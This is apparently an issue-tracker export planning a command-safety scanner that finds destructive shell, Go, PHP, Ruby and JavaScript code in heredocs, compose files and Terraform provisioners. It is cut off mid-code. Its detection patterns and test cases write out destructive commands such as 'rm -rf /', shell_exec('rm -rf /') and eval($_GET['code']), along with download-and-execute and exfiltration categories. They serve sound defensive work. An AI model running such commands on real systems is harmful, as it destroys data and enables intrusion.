{"id":"git_safety_guard-fu8","title":"Implement docker-compose extractor","description":"## Objective\n\nImplement an extractor for docker-compose files to detect executable command contexts.\n\n## File Pattern\n\n- `docker-compose.yml`\n- `docker-compose.yaml`\n- `compose.yml`\n- `compose.yaml`\n\n## Extraction Targets\n\n### Command Blocks (executed)\n- `command:` values\n- `entrypoint:` values\n- `healthcheck.test:` commands\n\n### NOT Extracted (data only)\n- `environment:` values\n- `labels:` values\n- Volume paths\n- Comments\n\n## Example\n\n```yaml\nservices:\n  app:\n    command: /bin/sh -c \"rm -rf /data/*\"  # EXTRACT THIS\n    environment:\n      CLEANUP: \"rm -rf /\"  # DO NOT extract\n```\n\n## Acceptance Criteria\n\n- Correctly extracts command/entrypoint with line numbers\n- Handles both string and array formats\n- Ignores environment variables and labels\n- Unit tests with representative fixtures","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T21:24:57.298774964-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:24:57.298774964-05:00","dependencies":[{"issue_id":"git_safety_guard-fu8","depends_on_id":"git_safety_guard-scan","type":"blocks","created_at":"2026-01-07T21:25:20.580453194-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-fuzz","title":"Implement fuzzing and property-based testing for heredoc parser","description":"# Fuzzing and Property-Based Testing\n\n## Objective\n\nEnsure heredoc detection is robust against malformed, malicious, or unexpected input through automated testing.\n\n## Fuzzing with cargo-fuzz\n\n### Setup\n\n```toml\n# Cargo.toml\n[dev-dependencies]\nlibfuzzer-sys = \"0.4\"\narbitrary = { version = \"1\", features = [\"derive\"] }\n```\n\n### Fuzz Targets\n\n```rust\n// fuzz/fuzz_targets/heredoc_extraction.rs\n#![no_main]\nuse libfuzzer_sys::fuzz_target;\nuse dcg::heredoc::extract_heredoc;\n\nfuzz_target!(|data: \u0026str| {\n    // Should never panic\n    let _ = extract_heredoc(data);\n});\n\n// fuzz/fuzz_targets/language_detection.rs\nfuzz_target!(|data: \u0026str| {\n    let _ = detect_language(data);\n});\n\n// fuzz/fuzz_targets/tier1_regex.rs\nfuzz_target!(|data: \u0026str| {\n    let _ = might_contain_heredoc(data);\n});\n\n// fuzz/fuzz_targets/full_pipeline.rs\nfuzz_target!(|data: \u0026str| {\n    // Full check should never panic\n    let _ = check_command(data);\n});\n```\n\n### Running Fuzzing\n\n```bash\n# Install cargo-fuzz\ncargo install cargo-fuzz\n\n# Run fuzz target\ncargo +nightly fuzz run heredoc_extraction -- -max_len=100000\n\n# Run for specific duration\ncargo +nightly fuzz run full_pipeline -- -max_total_time=3600\n```\n\n## Property-Based Testing with proptest\n\n```toml\n[dev-dependencies]\nproptest = \"1.4\"\n```\n\n```rust\nuse proptest::prelude::*;\n\nproptest! {\n    #[test]\n    fn heredoc_extraction_never_panics(s in \".*\") {\n        let _ = extract_heredoc(\u0026s);\n    }\n    \n    #[test]\n    fn valid_heredoc_roundtrips(\n        delimiter in \"[A-Z]+\",\n        content in \"[a-z0-9 \\\\n]*\",\n    ) {\n        let cmd = format!(\"cat \u003c\u003c '{}'\\n{}\\n{}\", delimiter, content, delimiter);\n        let result = extract_heredoc(\u0026cmd);\n        prop_assert!(result.is_ok());\n        prop_assert_eq!(result.unwrap().content.trim(), content.trim());\n    }\n    \n    #[test]\n    fn tier1_is_superset_of_tier2(\n        cmd in \".*\u003c\u003c.*\",\n    ) {\n        // If Tier 2 would process it, Tier 1 must detect it\n        if extract_heredoc(\u0026cmd).is_ok() {\n            prop_assert!(might_contain_heredoc(\u0026cmd));\n        }\n    }\n    \n    #[test]\n    fn safe_commands_never_blocked(\n        safe_cmd in \"(git status|cargo build|ls -la|echo [a-z]+)\"\n    ) {\n        let result = check_command(\u0026safe_cmd);\n        prop_assert!(!result.blocked);\n    }\n}\n```\n\n## Structured Fuzzing\n\n```rust\nuse arbitrary::Arbitrary;\n\n#[derive(Arbitrary, Debug)]\nenum HeredocStyle {\n    Standard,    // \u003c\u003c\n    Indented,    // \u003c\u003c-\n    Quoted,      // \u003c\u003c'DELIM'\n    DoubleQuoted,// \u003c\u003c\"DELIM\"\n}\n\n#[derive(Arbitrary, Debug)]\nstruct FuzzHeredoc {\n    style: HeredocStyle,\n    delimiter: String,\n    content: String,\n    command_prefix: String,\n}\n\nimpl FuzzHeredoc {\n    fn to_command(\u0026self) -\u003e String {\n        let marker = match self.style {\n            HeredocStyle::Standard =\u003e format!(\"\u003c\u003c{}\", self.delimiter),\n            HeredocStyle::Indented =\u003e format!(\"\u003c\u003c-{}\", self.delimiter),\n            HeredocStyle::Quoted =\u003e format!(\"\u003c\u003c'{}'\", self.delimiter),\n            HeredocStyle::DoubleQuoted =\u003e format!(\"\u003c\u003c\\\"{}\\\"\", self.delimiter),\n        };\n        format!(\"{}{}\\n{}\\n{}\", self.command_prefix, marker, self.content, self.delimiter)\n    }\n}\n\nfuzz_target!(|heredoc: FuzzHeredoc| {\n    let cmd = heredoc.to_command();\n    let _ = check_command(\u0026cmd);\n});\n```\n\n## CI Integration\n\n```yaml\n# .github/workflows/fuzz.yml\nname: Fuzz Testing\non:\n  schedule:\n    - cron: '0 0 * * 0'  # Weekly\n  workflow_dispatch:\n\njobs:\n  fuzz:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: dtolnay/rust-toolchain@nightly\n      - run: cargo install cargo-fuzz\n      - run: cargo +nightly fuzz run heredoc_extraction -- -max_total_time=600\n      - run: cargo +nightly fuzz run full_pipeline -- -max_total_time=600\n```\n\n## Success Criteria\n\n- Zero panics after 1M+ iterations\n- All fuzz targets run in CI\n- Coverage of edge cases documented\n- Crash reproduction tests for any found issues","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-fuzz","depends_on_id":"git_safety_guard-y4j","type":"blocks","created_at":"2026-01-07T19:46:42.405361011-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-fuzz","depends_on_id":"git_safety_guard-du4","type":"blocks","created_at":"2026-01-07T19:46:43.72144523-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-goph","title":"Define Go destructive patterns for heredoc scanning","description":"# Go Destructive Patterns for Heredoc Scanning\n\n## Why Go?\n\nGo is extremely common in DevOps/cloud tooling. Patterns like:\n- `go run script.go` with heredoc input\n- Embedded Go in shell scripts\n- Go template execution\n\n## Pattern Categories\n\n### 1. OS/Exec Patterns\n\n```go\n// Dangerous: Direct command execution\nexec.Command($CMD, $$$ARGS).Run()\nexec.Command($CMD, $$$ARGS).Output()\nexec.Command($CMD, $$$ARGS).CombinedOutput()\nos.exec.Command($CMD)\n\n// Dangerous: Shell execution\nexec.Command(\"sh\", \"-c\", $CMD)\nexec.Command(\"bash\", \"-c\", $CMD)\n```\n\n### 2. File System Patterns\n\n```go\n// Dangerous: Recursive deletion\nos.RemoveAll($PATH)\nfilepath.Walk($PATH, $$$) // if combined with os.Remove\n\n// Dangerous: File operations on system paths\nos.Remove(\"/etc/$$$\")\nos.Remove(\"/var/$$$\")\nos.Chmod($PATH, 0777)\nos.Chown($PATH, 0, 0)\n```\n\n### 3. Unsafe Patterns\n\n```go\n// Dangerous: Unsafe pointer operations\nunsafe.Pointer($X)\n(*[1 \u003c\u003c 30]byte)(unsafe.Pointer($X))\n\n// Dangerous: Reflection for code execution\nreflect.ValueOf($X).Call($$$)\n```\n\n### 4. Network Patterns\n\n```go\n// Suspicious: Download and execute\nhttp.Get($URL) // followed by exec\nioutil.ReadAll($RESP.Body) // followed by exec\n```\n\n## ast-grep Patterns\n\n```yaml\nid: go-exec-command\nlanguage: go\nrule:\n  pattern: exec.Command($CMD, $$$ARGS)\nmessage: \"Direct command execution detected\"\nseverity: error\n\nid: go-remove-all\nlanguage: go  \nrule:\n  pattern: os.RemoveAll($PATH)\nmessage: \"Recursive file deletion detected\"\nseverity: error\n```\n\n## Test Cases\n\n```go\n// Should BLOCK\nos.RemoveAll(\"/tmp/important\")\nexec.Command(\"rm\", \"-rf\", \"/\").Run()\n\n// Should ALLOW\nos.Remove(\"./local_file.txt\")  // Non-recursive, local\nfmt.Println(\"hello\")\n```\n\n## Dependencies\n\n- ast-grep-language must support Go (tree-sitter-go)\n- Pattern library structure design","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-goph","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T19:46:45.603432505-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-hcfg","title":"Add heredoc scanning configuration and CLI flags","description":"# Heredoc Scanning Configuration\n\n## Objective\n\nAllow users to configure heredoc scanning behavior via CLI flags and config file.\n\n## CLI Flags\n\n```\ndcg check [OPTIONS]\n\nHeredoc Scanning:\n    --heredoc-scan          Enable heredoc scanning (default: true)\n    --no-heredoc-scan       Disable heredoc scanning\n    --heredoc-timeout \u003cMS\u003e  Timeout for heredoc analysis (default: 50)\n    --heredoc-languages \u003cL\u003e Languages to scan (default: all)\n                            Values: python,bash,javascript,typescript,ruby,perl\n```\n\n## Config File (~/.config/dcg/config.toml)\n\n```toml\n[heredoc]\nenabled = true\ntimeout_ms = 50\nlanguages = [\"python\", \"bash\", \"javascript\", \"typescript\", \"ruby\", \"perl\"]\n\n# Graceful degradation\nfallback_on_parse_error = true  # Allow if parsing fails\nfallback_on_timeout = true       # Allow if timeout exceeded\n\n# Logging\nlog_heredoc_detection = false    # Log when heredocs detected\nlog_pattern_matches = false      # Log which patterns matched\n```\n\n## Pack Integration\n\nAdd heredoc scanning as a pack that can be enabled/disabled:\n\n```rust\n// In packs/heredoc.rs\npub fn create_pack() -\u003e Pack {\n    Pack {\n        id: \"heredoc\".to_string(),\n        name: \"Heredoc Scanning\",\n        description: \"Detect destructive patterns in inline scripts and heredocs\",\n        keywords: \u0026[\"\u003c\u003c\", \"-c\", \"-e\", \"python\", \"bash\", \"node\"],\n        safe_patterns: vec![],\n        destructive_patterns: vec![],  // Patterns defined per-language\n    }\n}\n```\n\n## Environment Variables\n\n- `DCG_HEREDOC_ENABLED=true|false`\n- `DCG_HEREDOC_TIMEOUT=50`\n- `DCG_HEREDOC_LANGUAGES=python,bash,javascript`\n\n## Default Behavior\n\n- Heredoc scanning: ENABLED by default\n- Timeout: 50ms\n- Languages: All supported\n- Fallback: Allow on error (fail-open for usability)\n\n## Test Cases\n\n- Verify --no-heredoc-scan skips heredoc detection\n- Verify timeout is respected\n- Verify language filtering works\n- Verify config file is loaded correctly\n- Verify environment variables override config","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-hcfg","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.542568801-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-jfj","title":"Design language detection heuristics","description":"# Design Language Detection Heuristics\n\n## Objective\nDesign reliable heuristics for determining the programming language of heredoc content.\n\n## Background\nTo scan heredoc content with ast-grep/tree-sitter, we need to know which language grammar to use. Language must be inferred from context clues.\n\n## Detection Sources (in priority order)\n\n### 1. Command Prefix (Most Reliable)\nMap command names to languages:\n- python, python3, python2 -\u003e Python\n- bash, sh, zsh, ksh -\u003e Bash\n- node, nodejs -\u003e JavaScript\n- ruby, irb -\u003e Ruby\n- perl -\u003e Perl\n- php -\u003e PHP\n\n### 2. Shebang Line (Heredoc Content)\nIf heredoc starts with #!, parse the interpreter:\n- #!/usr/bin/env python3 -\u003e Python\n- #!/bin/bash -\u003e Bash\n- #!/usr/bin/node -\u003e JavaScript\n\n### 3. File Extension in Command\nSome commands specify a language via temp file extension:\n- cat \u003e /tmp/script.py \u003c\u003c EOF -\u003e Python\n- This is less common but worth supporting\n\n### 4. Content Heuristics (Fallback)\nAnalyze content for language-specific patterns:\n- \"import \" at start of line -\u003e likely Python\n- \"function \" or \"const \" -\u003e likely JavaScript\n- \"def \" and \"end\" -\u003e likely Ruby\n- This is unreliable but better than nothing\n\n### 5. Configuration Override\nAllow users to specify default language for unknown heredocs.\n\n## Design Considerations\n\n### Ambiguity Handling\n- What if detection is uncertain?\n- Should we scan with multiple grammars?\n- Should we skip uncertain content?\n\n### Performance\n- Command prefix lookup should be O(1) hash map\n- Shebang detection is simple string parsing\n- Content heuristics should be bounded (first 10 lines)\n\n### Extensibility\n- Users should be able to add custom command-\u003elanguage mappings\n- New languages should be easy to add\n\n## Deliverables\n- Language detection algorithm specification\n- Command-to-language mapping table\n- Fallback strategy for unknown languages\n- Configuration schema for custom mappings\n\n## Success Criteria\n- Correctly identify language for 95%+ of real-world heredocs\n- Graceful degradation for unknown languages\n- Configuration mechanism for edge cases","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:29:39.984610362-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:29:39.984610362-05:00","dependencies":[{"issue_id":"git_safety_guard-jfj","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:29:45.118494749-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-mcf","title":"Define JavaScript/Node destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous JavaScript/Node.js constructs within heredoc bodies.\n\n## Why This Matters\n\nNode.js heredocs (node -e, node \u003c\u003cEOF) are a significant attack vector because:\n1. Node has full filesystem and process access via built-in modules\n2. npm/npx can execute arbitrary packages\n3. child_process module provides shell execution capabilities\n\n## Pattern Categories to Define\n\n### Filesystem Operations\n- fs.rmSync, fs.rmdirSync with recursive option\n- fs.unlinkSync on critical paths\n- fs.writeFileSync overwriting system files\n- rimraf and similar destructive packages\n\n### Process Execution\n- child_process.exec, execSync, spawn, spawnSync\n- Commands piped to shell interpreters\n- process.kill on system processes\n\n### Dangerous Requires/Imports\n- require('child_process')\n- Dynamic requires with user input\n- import() with untrusted paths\n\n### Network Exfiltration\n- http/https requests to unknown endpoints\n- fs.readFileSync followed by network calls\n- Buffer manipulations for data encoding\n\n### Package Manager Abuse\n- Requiring packages that execute on install\n- npx with arbitrary package names\n- Global installs of untrusted packages\n\n## Implementation Notes\n\nJavaScript patterns need to handle:\n- CommonJS vs ES modules syntax\n- async/await patterns\n- Promise chains\n- Destructuring in imports\n- Template literals\n- eval() and Function() constructors\n\nUse tree-sitter-javascript for parsing. Consider typescript patterns separately.\n\n## Test Cases\n\nEach pattern needs tests for:\n- Various import styles (require, import, dynamic import)\n- Async vs sync API variants\n- Method chaining patterns\n- Callback vs Promise vs async/await styles\n\n## Dependencies\n\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:35:33.877595699-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:35:39.971741549-05:00","dependencies":[{"issue_id":"git_safety_guard-mcf","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:35:39.990890431-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mcf","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:35:40.010899112-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-mvh","title":"Define Ruby destructive patterns for heredoc scanning","description":"## Objective\n\nDefine ast-grep/tree-sitter patterns to detect dangerous Ruby constructs within heredoc bodies.\n\n## Why This Matters\n\nRuby heredocs are dangerous because:\n1. Ruby has powerful metaprogramming (eval, define_method, method_missing)\n2. Backticks and system() provide easy shell access\n3. FileUtils module has destructive filesystem operations\n4. Ruby's flexibility makes static analysis challenging\n\n## Pattern Categories to Define\n\n### Shell Execution\n- Backtick commands: `dangerous command`\n- system(), exec(), spawn() calls\n- %x{} syntax for shell commands\n- Open3 module usage\n- IO.popen for process execution\n\n### Filesystem Operations\n- FileUtils.rm_rf, FileUtils.remove_dir\n- File.delete, File.unlink\n- Dir.rmdir, Dir.delete\n- Pathname#rmtree\n\n### Metaprogramming Dangers\n- eval() and instance_eval\n- send() and public_send() with dynamic methods\n- define_method with external input\n- const_get with dynamic names\n- method_missing abuse\n\n### Kernel Methods\n- Kernel.exit!, Kernel.abort\n- Kernel.load, Kernel.require with dynamic paths\n- Kernel.fork and process manipulation\n\n### Data Exfiltration\n- Net::HTTP requests\n- open-uri with external URLs\n- Socket operations\n\n## Implementation Notes\n\nRuby parsing challenges:\n- Multiple string syntaxes (', \", %, heredocs)\n- Blocks and procs as arguments\n- Method calls without parentheses\n- Symbol to proc (\u0026:method_name)\n- Duck typing makes type inference hard\n\nUse tree-sitter-ruby for parsing.\n\n## Test Cases\n\nRuby-specific test cases:\n- Block syntax variations\n- Method chaining\n- Metaprogramming patterns\n- Different string quoting styles\n\n## Dependencies\n\n- Pattern library structure design\n- ast-grep invocation layer\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T18:37:18.506057604-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:37:26.473732741-05:00","dependencies":[{"issue_id":"git_safety_guard-mvh","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:37:35.430025823-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-mvh","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:37:35.449812115-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-o15","title":"Design heredoc detection strategy","description":"# Design Heredoc Detection Strategy\n\n## Objective\nDesign a robust, performant strategy for detecting heredoc syntax in shell commands.\n\n## Background\nHeredocs appear in many forms across different shells and use cases. We need to detect when a command contains embedded script content that should be scanned for destructive patterns.\n\n## Heredoc Syntax Variants to Support\n\n### Bash/POSIX Shell\n- Basic: command \u003c\u003c DELIMITER ... DELIMITER\n- Quoted (no expansion): command \u003c\u003c 'DELIMITER' ... DELIMITER\n- Tab-stripped: command \u003c\u003c- DELIMITER ... DELIMITER\n- Here-string: command \u003c\u003c\u003c \"string\"\n\n### Other Shells\n- Zsh: same as bash plus \u003c\u003c~ for indentation stripping\n- Fish: different syntax entirely\n\n### Inline Scripts (not heredocs but similar)\n- Python -c \"code\"\n- node -e \"code\"\n- ruby -e \"code\"\n- perl -e \"code\"\n\n## Design Considerations\n\n### 1. Detection Approach\n- Regex-based quick check (fast, may have false positives)\n- Full parsing (accurate, slower)\n- Hybrid: regex for detection, parsing for extraction\n\n### 2. Content Extraction\n- How to correctly identify delimiter boundaries\n- Handling of quoted vs unquoted delimiters\n- Preservation of indentation for \u003c\u003c-\n\n### 3. Edge Cases\n- Nested heredocs\n- Heredocs in command substitution\n- Multiple heredocs in one command\n- Empty heredocs\n- Heredocs with special delimiters (containing quotes, spaces)\n\n### 4. Performance Budget\n- Detection should add \u003c 1ms to non-heredoc commands\n- Extraction should be \u003c 5ms for typical heredocs\n\n## Deliverables\n- Specification document with:\n  - Supported heredoc forms\n  - Detection algorithm\n  - Extraction algorithm\n  - Edge case handling\n  - Performance requirements\n\n## Success Criteria\n- Clear specification that can be implemented\n- Covers all common heredoc forms\n- Performance requirements are realistic and measurable\n\n## Dependencies\n- Benefits from ast-grep research (may inform approach)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-07T18:29:15.526903078-05:00","created_by":"ubuntu","updated_at":"2026-01-07T18:29:15.526903078-05:00","dependencies":[{"issue_id":"git_safety_guard-o15","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:29:24.626856626-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-p9e","title":"Implement Terraform extractor (provisioners)","description":"## Objective\n\nImplement an extractor for Terraform files to detect executable provisioner contexts.\n\n## File Pattern\n\n- `*.tf`\n\n## Extraction Targets\n\n### Provisioner Blocks (executed)\n- `local-exec` command\n- `remote-exec` inline commands\n- `null_resource` provisioners\n\n### NOT Extracted (data only)\n- Variable definitions\n- Output values\n- Resource attributes (non-provisioner)\n- Comments\n\n## Example\n\n```hcl\nresource \"null_resource\" \"cleanup\" {\n  provisioner \"local-exec\" {\n    command = \"rm -rf /tmp/*\"  # EXTRACT THIS\n  }\n}\n\nvariable \"dangerous\" {\n  default = \"rm -rf /\"  # DO NOT extract\n}\n```\n\n## Acceptance Criteria\n\n- Correctly extracts provisioner commands with line numbers\n- Handles HCL2 syntax (Terraform 0.12+)\n- Ignores non-executable blocks\n- Unit tests with representative fixtures","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T21:24:57.275380054-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:24:57.275380054-05:00","dependencies":[{"issue_id":"git_safety_guard-p9e","depends_on_id":"git_safety_guard-scan","type":"blocks","created_at":"2026-01-07T21:25:20.549018763-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-perf","title":"Implement performance benchmarks for heredoc detection","description":"# Performance Benchmark Suite\n\n## Objective\n\nCreate benchmarks to measure and enforce performance budgets for heredoc detection.\n\n## Performance Budgets\n\n| Operation | Budget | Panic Threshold |\n|-----------|--------|----------------|\n| Tier 1 regex check | \u003c 10Î¼s | \u003e 100Î¼s |\n| Heredoc extraction | \u003c 500Î¼s | \u003e 2ms |\n| Language detection | \u003c 50Î¼s | \u003e 200Î¼s |\n| AST parsing (small) | \u003c 2ms | \u003e 10ms |\n| AST parsing (large) | \u003c 10ms | \u003e 50ms |\n| Full pipeline | \u003c 15ms | \u003e 50ms |\n\n## Benchmark Implementation\n\nUsing criterion for statistical benchmarks:\n\n```rust\n// benches/heredoc_perf.rs\nuse criterion::{criterion_group, criterion_main, Criterion, BenchmarkId};\n\nfn bench_tier1_regex(c: \u0026mut Criterion) {\n    let cases = [\n        (\"simple\", \"git status\"),\n        (\"heredoc_marker\", \"python3 \u003c\u003c 'EOF'\\nprint('hi')\\nEOF\"),\n        (\"inline_script\", \"bash -c 'echo hello'\"),\n        (\"long_command\", \u0026\"x\".repeat(10000)),\n    ];\n    \n    let mut group = c.benchmark_group(\"tier1_regex\");\n    for (name, cmd) in cases {\n        group.bench_with_input(\n            BenchmarkId::new(\"might_contain_heredoc\", name),\n            cmd,\n            |b, cmd| b.iter(|| might_contain_heredoc(cmd)),\n        );\n    }\n    group.finish();\n}\n\nfn bench_full_pipeline(c: \u0026mut Criterion) {\n    // Benchmark complete heredoc check flow\n}\n\ncriterion_group!(benches, bench_tier1_regex, bench_full_pipeline);\ncriterion_main!(benches);\n```\n\n## Cargo.toml Addition\n\n```toml\n[[bench]]\nname = \"heredoc_perf\"\nharness = false\n\n[dev-dependencies]\ncriterion = \"0.5\"\n```\n\n## CI Integration\n\nAdd to CI pipeline:\n```yaml\n- name: Run benchmarks\n  run: cargo bench --bench heredoc_perf -- --noplot\n```\n\n## Regression Detection\n\nStore baseline and compare:\n```bash\n# Save baseline\ncargo bench --bench heredoc_perf -- --save-baseline main\n\n# Compare against baseline\ncargo bench --bench heredoc_perf -- --baseline main\n```\n\n## Test Data\n\nCreate fixtures:\n- `benches/fixtures/small_heredoc.txt` (10 lines)\n- `benches/fixtures/medium_heredoc.txt` (100 lines)  \n- `benches/fixtures/large_heredoc.txt` (1000 lines)\n- `benches/fixtures/real_world_samples/` (actual heredocs from the wild)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-perf","depends_on_id":"git_safety_guard-e7m","type":"blocks","created_at":"2026-01-07T19:28:32.686523631-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-phpp","title":"Define PHP destructive patterns for heredoc scanning","description":"# PHP Destructive Patterns for Heredoc Scanning\n\n## Why PHP?\n\nPHP is common in web servers and often executed via:\n- `php -r 'code'`\n- `php \u003c\u003c 'EOF'`\n- Embedded in shell scripts for web automation\n\n## Pattern Categories\n\n### 1. Command Execution\n\n```php\n// Dangerous: Direct shell execution\nexec($CMD)\nshell_exec($CMD)\nsystem($CMD)\npassthru($CMD)\n`$CMD`  // backtick operator\nproc_open($CMD, $$$)\npopen($CMD, $MODE)\n\n// Dangerous: Eval\neval($CODE)\nassert($CODE)  // can execute code\ncreate_function($ARGS, $CODE)\npreg_replace('/.*/e', $CODE, $INPUT)  // /e modifier\n```\n\n### 2. File System Patterns\n\n```php\n// Dangerous: File deletion\nunlink($PATH)\nrmdir($PATH)\narray_map('unlink', glob($PATTERN))\n\n// Dangerous: Recursive operations\n// Custom recursive delete functions\nRecursiveDirectoryIterator + unlink\n\n// Dangerous: File operations\nfile_put_contents('/etc/$$$', $DATA)\nchmod($PATH, 0777)\nchown($PATH, 'root')\n```\n\n### 3. Include/Require Patterns\n\n```php\n// Dangerous: Dynamic includes\ninclude($VAR)\ninclude_once($VAR)\nrequire($VAR)\nrequire_once($VAR)\n\n// Dangerous: Remote includes (if allow_url_include=On)\ninclude('http://$$$')\ninclude('ftp://$$$')\n```\n\n### 4. Database Patterns\n\n```php\n// Dangerous: Raw SQL\nmysql_query(\"DROP $$$\")\nmysqli_query($CONN, \"DROP $$$\")\n$pdo-\u003equery(\"DROP $$$\")\n$pdo-\u003eexec(\"DROP $$$\")\n```\n\n## ast-grep Patterns\n\n```yaml\nid: php-shell-exec\nlanguage: php\nrule:\n  any:\n    - pattern: shell_exec($CMD)\n    - pattern: exec($CMD)\n    - pattern: system($CMD)\n    - pattern: passthru($CMD)\nmessage: \"Shell command execution detected\"\nseverity: error\n\nid: php-eval\nlanguage: php\nrule:\n  pattern: eval($CODE)\nmessage: \"Dynamic code evaluation detected\"\nseverity: error\n```\n\n## Test Cases\n\n```php\n// Should BLOCK\nshell_exec('rm -rf /');\neval($_GET['code']);\ninclude($user_input);\n\n// Should ALLOW\necho \"Hello World\";\n$result = 1 + 2;\n```\n\n## Dependencies\n\n- ast-grep-language must support PHP (tree-sitter-php)\n- Pattern library structure design","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:00:00-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:00:00-05:00","dependencies":[{"issue_id":"git_safety_guard-phpp","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T19:46:46.424057305-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-rbst","title":"Implement robustness and edge case handling for heredoc parsing","description":"# Robustness and Edge Case Handling\n\n## Objective\n\nEnsure heredoc detection handles all edge cases gracefully without crashing, hanging, or causing unexpected behavior.\n\n## Edge Cases to Handle\n\n### 1. Size Limits\n\n```rust\nconst MAX_HEREDOC_SIZE: usize = 1_000_000; // 1MB\nconst MAX_HEREDOC_LINES: usize = 10_000;\n\nfn extract_heredoc(cmd: \u0026str) -\u003e Result\u003cHeredocInfo, HeredocError\u003e {\n    let content = extract_content(cmd)?;\n    \n    if content.len() \u003e MAX_HEREDOC_SIZE {\n        tracing::warn!(size = content.len(), \"heredoc_too_large: skipping analysis\");\n        return Err(HeredocError::TooLarge { size: content.len() });\n    }\n    // ...\n}\n```\n\n### 2. Timeout Protection\n\n```rust\nuse std::time::{Duration, Instant};\n\nconst PARSE_TIMEOUT: Duration = Duration::from_millis(50);\n\nfn parse_with_timeout(content: \u0026str, lang: Language) -\u003e Result\u003cAst, ParseError\u003e {\n    let start = Instant::now();\n    \n    // Check timeout periodically during parsing\n    let ast = parse_internal(content, lang, || {\n        if start.elapsed() \u003e PARSE_TIMEOUT {\n            return Err(ParseError::Timeout);\n        }\n        Ok(())\n    })?;\n    \n    Ok(ast)\n}\n```\n\n### 3. Malformed Heredoc Handling\n\n```rust\nenum HeredocError {\n    MissingDelimiter,\n    UnterminatedHeredoc,\n    InvalidDelimiter { delimiter: String },\n    EncodingError,\n    TooLarge { size: usize },\n    TooManyLines { lines: usize },\n    Timeout,\n}\n\n// Graceful handling - fail-open for usability\nfn handle_heredoc_error(e: HeredocError) -\u003e CheckResult {\n    tracing::warn!(error = ?e, \"heredoc_parse_error: allowing command\");\n    CheckResult::allowed()\n}\n```\n\n### 4. Binary/Non-Text Content\n\n```rust\nfn is_likely_text(content: \u0026[u8]) -\u003e bool {\n    // Check for null bytes or high ratio of non-printable chars\n    let null_count = content.iter().filter(|\u0026\u0026b| b == 0).count();\n    let non_printable = content.iter().filter(|\u0026\u0026b| b \u003c 32 \u0026\u0026 b != b'\\n' \u0026\u0026 b != b'\\t').count();\n    \n    null_count == 0 \u0026\u0026 (non_printable as f64 / content.len() as f64) \u003c 0.1\n}\n\nfn extract_heredoc(cmd: \u0026str) -\u003e Result\u003cHeredocInfo, HeredocError\u003e {\n    let content = extract_content(cmd)?;\n    \n    if !is_likely_text(content.as_bytes()) {\n        tracing::debug!(\"binary_content_detected: skipping heredoc analysis\");\n        return Err(HeredocError::BinaryContent);\n    }\n    // ...\n}\n```\n\n### 5. Encoding Issues\n\n```rust\nfn normalize_encoding(content: \u0026[u8]) -\u003e Result\u003cString, HeredocError\u003e {\n    // Try UTF-8 first\n    if let Ok(s) = std::str::from_utf8(content) {\n        return Ok(s.to_string());\n    }\n    \n    // Try lossy conversion\n    let lossy = String::from_utf8_lossy(content);\n    tracing::debug!(\"non_utf8_content: using lossy conversion\");\n    Ok(lossy.into_owned())\n}\n```\n\n### 6. Multiple Heredocs\n\n```rust\nstruct MultiHeredoc {\n    heredocs: Vec\u003cHeredocInfo\u003e,\n}\n\nfn extract_all_heredocs(cmd: \u0026str) -\u003e Vec\u003cHeredocInfo\u003e {\n    let mut heredocs = vec![];\n    let mut remaining = cmd;\n    \n    while let Some((heredoc, rest)) = extract_next_heredoc(remaining) {\n        heredocs.push(heredoc);\n        remaining = rest;\n        \n        // Limit to prevent DoS\n        if 